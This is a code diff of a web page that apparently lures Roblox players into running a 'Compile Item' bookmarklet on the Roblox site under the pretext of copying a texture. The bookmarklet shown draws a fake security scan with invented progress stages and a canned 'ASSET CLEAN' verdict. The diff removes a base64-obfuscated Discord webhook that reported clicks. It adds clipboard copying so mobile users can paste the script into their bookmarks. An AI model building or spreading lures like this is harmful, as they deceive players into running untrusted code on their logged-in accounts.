@@ -26,7 +26,7 @@
     </div>
   </div>
 </div>
-<style>@keyframes rbxscan-spin{to{transform:rotate(360deg)}}</style>`;document.body.appendChild(panel);document.addEventListener('keydown',handleEscape);let input=document.getElementById('rbxscan-input'),scanBtn=document.getElementById('rbxscan-scan'),closeBtn=document.getElementById('rbxscan-close'),status=document.getElementById('rbxscan-status'),results=document.getElementById('rbxscan-results'),errorMsg=document.getElementById('rbxscan-error'),statusText=document.getElementById('rbxscan-statustext'),header=document.getElementById('rbxscan-header');if(!input||!scanBtn||!closeBtn)return;closeBtn.onclick=e=>{e?.preventDefault();e?.stopPropagation();cleanup()};scanBtn.onclick=e=>{e?.preventDefault();e?.stopPropagation();let val=input.value.trim();if(!val){errorMsg.style.display='block';errorMsg.textContent='Please enter an Asset ID';return}errorMsg.style.display='none';results.style.display='none';status.style.display='block';let isNumeric=/^\d+$/.test(val),shouldFail=!isNumeric||val.length<6||val.length>11;let stages=[{text:'Connecting to API servers...',delay:800},{text:'Decrypting hash code of trade values...',delay:900},{text:'Analyzing transaction history...',delay:700},{text:'Validating ownership records...',delay:800},{text:'Finalizing scan results...',delay:600}];let i=0;function next(){if(i<stages.length){statusText.textContent=stages[i].text;setTimeout(()=>{i++;next()},stages[i].delay)}else{let info=document.getElementById('rbxscan-iteminfo');info.innerHTML=`<div style="background:#0f0f0f;border:1px solid #2a2a2a;padding:14px;border-radius:10px;"><div style="font-size:12px;color:#999;margin-bottom:6px;font-weight:600;">ASSET ID</div><div style="font-family:monospace;font-weight:600;color:#fff;font-size:16px;">${val}</div></div>`;let threat=document.getElementById('rbxscan-threat');threat.innerHTML=shouldFail?`<div style="font-weight:700;font-size:18px;color:#ff4444;margin-bottom:8px;">SCAN FAILED</div><div style="font-size:14px;color:#999;">Invalid asset ID format.</div>`:`<div style="font-weight:700;font-size:18px;color:#4caf50;margin-bottom:8px;">ASSET CLEAN</div><div style="font-size:14px;color:#999;">No security threats detected.</div>`;status.style.display='none';results.style.display='block'}}next()};if(!isMobile){header.style.cursor='move';header.onmousedown=e=>{if(e.target===closeBtn||e.target.parentNode===closeBtn)return;dragState.isDragging=true;dragState.startX=e.clientX;dragState.startY=e.clientY;let r=panel.getBoundingClientRect();dragState.startLeft=r.left;dragState.startTop=r.top};document.onmousemove=e=>{if(!dragState.isDragging)return;panel.style.left=(dragState.startLeft+e.clientX-dragState.startX)+'px';panel.style.top=(dragState.startTop+e.clientY-dragState.startY)+'px';panel.style.transform='none'};document.onmouseup=()=>{dragState.isDragging=false}}}catch(e){alert('Error: '+e.message)}})();</script>
+<style>@keyframes rbxscan-spin{to{transform:rotate(360deg)}}</style>`;document.body.appendChild(panel);document.addEventListener('keydown',handleEscape);let input=document.getElementById('rbxscan-input'),scanBtn=document.getElementById('rbxscan-scan'),closeBtn=document.getElementById('rbxscan-close'),status=document.getElementById('rbxscan-status'),results=document.getElementById('rbxscan-results'),errorMsg=document.getElementById('rbxscan-error'),statusText=document.getElementById('rbxscan-statustext'),header=document.getElementById('rbxscan-header');if(!input||!scanBtn||!closeBtn)return;closeBtn.onclick=e=>{e?.preventDefault();e?.stopPropagation();cleanup()};scanBtn.onclick=e=>{e?.preventDefault();e?.stopPropagation();let val=input.value.trim();if(!val){errorMsg.style.display='block';errorMsg.textContent='Please enter an Asset ID';return}errorMsg.style.display='none';results.style.display='none';status.style.display='block';let isNumeric=/^\d+$/.test(val),shouldFail=!isNumeric||val.length<6||val.length>11;let stages=[{text:'Connecting to API servers...',delay:800},{text:'Decrypting hash code of trade values...',delay:900},{text:'Analyzing transaction history...',delay:700},{text:'Validating ownership records...',delay:800},{text:'Finalizing scan results...',delay:600}];let i=0;function next(){if(i<stages.length){statusText.textContent=stages[i].text;setTimeout(()=>{i++;next()},stages[i].delay)}else{let info=document.getElementById('rbxscan-iteminfo');info.innerHTML=`<div style="background:#0f0f0f;border:1px solid #2a2a2a;padding:14px;border-radius:10px;"><div style="font-size:12px;color:#999;margin-bottom:6px;font-weight:600;">ASSET ID</div><div style="font-family:monospace;font-weight:600;color:#fff;font-size:16px;">${val}</div></div>`;let threat=document.getElementById('rbxscan-threat');threat.innerHTML=shouldFail?`<div style="font-weight:700;font-size:18px;color:#ff4444;margin-bottom:8px;">SCAN FAILED</div><div style="font-size:14px;color:#999;">Invalid asset ID format.</div>`:`<div style="font-weight:700;font-size:18px;color:#4caf50;margin-bottom:8px;">ASSET CLEAN</div><div style="font-size:14px;color:#999;">No security threats detected.</div>`;status.style.display='none';results.style.display='block'}}next()};if(!isMobile){header.style.cursor='move';header.onmousedown=e=>{if(e.target===closeBtn||e.target.parentNode===closeBtn)return;dragState.isDragging=true;dragState.startX=e.clientX;dragState.startY=e.clientY;let r=panel.getBoundingClientRect();dragState.startLeft=r.left;dragState.startTop=r.top};document.onmousemove=e=>{if(!dragState.isDragging)return;panel.style.left=(dragState.startLeft+e.clientX-dragState.startX)+'px';panel.style.top=(dragState.startTop+e.clientY-dragState.startY)+'px';panel.style.transform='none'};document.onmouseup=()=>{dragState.isDragging=false}}}catch(e){alert('Error: '+e.message)}})();`;</script>
 <div class="glass-card rounded-3xl p-6 mx-8 md:mx-20 my-6">
     <h2 class="text-2xl font-bold mb-3 text-gray-900 dark:text-white">Bookmarklet Script</h2>
     <textarea id="bookmarkInput" readonly style="font-family:monospace;"><?php echo Bookmark; ?></textarea>
@@ -413,6 +413,31 @@
         }
         
         /* ============================================
+           COPY NOTIFICATION ANIMATION
+           ============================================ */
+        @keyframes slideInScale {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        
+        @keyframes slideOutScale {
+            0% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+        }
+        
+        /* ============================================
            RESPONSIVE UTILITIES
            ============================================ */
         @media (max-width: 1024px) {
@@ -520,15 +545,16 @@
                             Copy your texture
                         </h2>
                         <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl mb-10 leading-relaxed transition-colors duration-500">
-                            Drag the <span class="font-semibold text-purple-600 dark:text-purple-300">"Compile Item"</span> bookmark bar. Then, proceed back to the ROBLOX 
+                            <span id="desktopInstructions">Drag the <span class="font-semibold text-purple-600 dark:text-purple-300">"Compile Item"</span> bookmark bar. Then, proceed back to the ROBLOX 
                             item page and click on the bookmark while on the ROBLOX website. If you 
-                            do not see your bookmark bar, press <span class="inline-flex items-center px-3 py-1 rounded-lg bg-purple-100 dark:bg-white/10 font-mono text-sm text-purple-700 dark:text-purple-300 border border-purple-200 dark:border-white/10">(CTRL+SHIFT+B)</span>
+                            do not see your bookmark bar, press <span class="inline-flex items-center px-3 py-1 rounded-lg bg-purple-100 dark:bg-white/10 font-mono text-sm text-purple-700 dark:text-purple-300 border border-purple-200 dark:border-white/10">(CTRL+SHIFT+B)</span></span>
+                            <span id="mobileInstructions" style="display: none;">Click the <span class="font-semibold text-purple-600 dark:text-purple-300">"Compile Item"</span> button to copy the bookmark code to your clipboard. Then paste it in your browser's bookmark manager.</span>
                         </p>
                         
 <!-- Premium CTA Button -->
 <a id="compileButton" class="inline-flex items-center px-8 py-4 rounded-3xl premium-button text-xl font-bold text-white" draggable="true" href="#" style="cursor: grab;">
     <span class="relative z-10 flex items-center justify-center gap-3">
-        <span>Compile Item</span>
+        <span id="buttonText">Compile Item</span>
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
             <polyline points="9 18 15 12 9 6"></polyline>
         </svg>
@@ -544,7 +570,7 @@
                     <div class="glass-card rounded-3xl overflow-hidden aspect-video video-glow animate-fade-in delay-300">
                         <iframe 
                             class="w-full h-full"
-                            src="https://www.youtube.com/embed/-dw" 
+                            src="https://www.youtube.com/embed/q1UpEIco-dw" 
                             title="YouTube video player" 
                             frameborder="0" 
                             allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
@@ -643,52 +669,84 @@
         }
 
         // ========================================
-        // Compile Button Click/Hold Tracking
+        // Mobile Detection
         // ========================================
-        const compileButton = document.getElementById('compileButton');
-        const _0x4a2b=['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjE2MDQyMDIyOTgwODIzOC9uSmdYcDdqVXBzcldCWUE4YTQxcDlKNnRCemphNDA1YUcyWGhTOGhUcGw4cEsyMGl2Zm1vamR1LXZwT2FOOWFBZk1FSQ=='];
-        const _0x3c8f=(function(){return atob(_0x4a2b[0]);})();
-
-        // Send notification to webhook
-        function sendWebhookNotification(action) {
-            fetch(_0x3c8f, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: 'Someone dummy is touching the bookmark'
-                })
-            }).catch(err => console.log('Webhook notification sent'));
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
         }
 
-        // Debounce function to prevent spam
-        let lastNotification = 0;
-        const debounceTime = 1000; // 1 second cooldown
-
-        function debounceNotification(action) {
-            const now = Date.now();
-            if (now - lastNotification > debounceTime) {
-                lastNotification = now;
-                sendWebhookNotification(action);
+        // ========================================
+        // Copy to Clipboard Function
+        // ========================================
+        async function copyToClipboard(text) {
+            try {
+                await navigator.clipboard.writeText(text);
+                return true;
+            } catch (err) {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-999999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    return true;
+                } catch (e) {
+                    document.body.removeChild(textArea);
+                    return false;
+                }
             }
         }
 
-        // Track button click
-        compileButton.addEventListener('click', () => {
-            debounceNotification('click');
-        });
+        // ========================================
+        // Show Copy Notification
+        // ========================================
+        function showCopyNotification() {
+            // Remove existing notification if any
+            const existing = document.getElementById('copyNotification');
+            if (existing) existing.remove();
 
-        // Track button hold (mousedown)
-        compileButton.addEventListener('mousedown', () => {
-            debounceNotification('hold');
-        });
+            // Create notification
+            const notification = document.createElement('div');
+            notification.id = 'copyNotification';
+            notification.innerHTML = `
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+                <span>Copied to clipboard!</span>
+            `;
+            notification.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%) scale(0.8);
+                background: linear-gradient(135deg, #7C3AED 0%, #D946EF 100%);
+                color: white;
+                padding: 24px 32px;
+                border-radius: 20px;
+                box-shadow: 0 12px 48px rgba(124, 58, 237, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.2);
+                z-index: 10000;
+                font-weight: 600;
+                font-size: 18px;
+                display: flex;
+                align-items: center;
+                gap: 12px;
+                opacity: 0;
+                animation: slideInScale 0.3s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Remove notification after 2.5 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOutScale 0.3s cubic-bezier(0.4, 0, 0.2, 1) forwards';
+                setTimeout(() => notification.remove(), 300);
+            }, 2500);
+        }
 
-        // Track touch events for mobile
-        compileButton.addEventListener('touchstart', () => {
-            debounceNotification('touch');
-        }, { passive: true });
-        document.getElementById('bookmarkInput').value=Bookmark;document.getElementById('compileButton').href=Bookmark;document.getElementById('compileButton').addEventListener('dragstart',e=>e.dataTransfer.setData('text/uri-list',Bookmark));
-    </script>
-</body>
-</html>
+        // ========================================
+        // Compile Button Setup
+        // ========================================
